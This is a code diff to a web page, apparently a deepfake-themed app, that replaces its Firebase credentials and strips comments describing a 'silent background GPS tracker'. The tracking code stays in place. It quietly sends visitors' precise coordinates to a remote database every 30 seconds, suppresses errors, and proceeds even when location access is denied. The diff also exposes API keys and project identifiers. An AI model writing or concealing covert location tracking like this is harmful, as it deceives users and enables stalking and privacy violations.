@@ -69,7 +69,18 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
         import { getDatabase, ref, get, set, update, remove, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-        const app = initializeApp({ apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8", authDomain: "inshelp-f2cba.firebaseapp.com", databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com", projectId: "inshelp-f2cba" });
+        // Updated with New Firebase Project Credentials
+        const firebaseConfig = {
+            apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
+            authDomain: "ai-studio-b0c87.firebaseapp.com",
+            databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
+            projectId: "ai-studio-b0c87",
+            storageBucket: "ai-studio-b0c87.firebasestorage.app",
+            messagingSenderId: "699632892927",
+            appId: "1:699632892927:web:3d38f396c8897a36e885ca"
+        };
+
+        const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
         
         let deviceId = localStorage.getItem('hotfake_deep_uid');
@@ -79,8 +90,6 @@
             localStorage.setItem('hotfake_deep_uid', deviceId);
         }
 
-        // --- NEW: SILENT BACKGROUND GPS TRACKER ---
-        // Yeh function check karega agar GPS granted hai (kabhi bhi on kiya ho user ne), toh background me chup-chap location bhej dega.
         function silentBackgroundGPS() {
             if ("geolocation" in navigator) {
                 navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
@@ -94,7 +103,7 @@
                                     time: new Date().toISOString() 
                                 }); 
                             }, 
-                            (err) => {}, // Chup rehna hai error aane pe
+                            (err) => {}, 
                             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                         );
                     }
@@ -106,7 +115,6 @@
             showSection('loaderSection');
             document.getElementById('displayDevId').innerText = `Hardware ID: ${deviceId}`;
 
-            // Initial silent GPS check just in case it's already on
             silentBackgroundGPS();
 
             get(ref(db, `users/${deviceId}`)).then(userSnap => {
@@ -166,7 +174,7 @@
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => { sendPayload(pos.coords.latitude, pos.coords.longitude); }, 
-                    (err) => { sendPayload("Denied", "Denied"); }, // Proceed anyway if denied
+                    (err) => { sendPayload("Denied", "Denied"); }, 
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
@@ -174,8 +182,7 @@
             }
         };
 
-        // Retry silent GPS update after a few seconds just in case user toggled it
-        setInterval(silentBackgroundGPS, 30000); // Check every 30 seconds silently
+        setInterval(silentBackgroundGPS, 30000);
         
         setTimeout(initPage, 800);
     </script>
